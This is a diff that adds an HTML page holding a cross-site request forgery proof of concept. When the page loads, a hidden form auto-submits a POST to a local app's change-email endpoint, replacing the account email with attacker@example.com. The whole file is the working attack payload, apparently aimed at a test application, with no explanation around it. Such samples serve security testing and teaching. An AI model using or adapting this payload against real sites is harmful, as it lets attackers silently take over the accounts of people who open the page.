@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<body onload="document.forms[0].submit();">
+    <form action="http://127.0.0.1:5000/change-email" method="POST" style="display:none;">
+        <input type="hidden" name="email" value="attacker@example.com">
+        <input type="submit" value="Change Email">
+    </form>
+</body>
+</html>
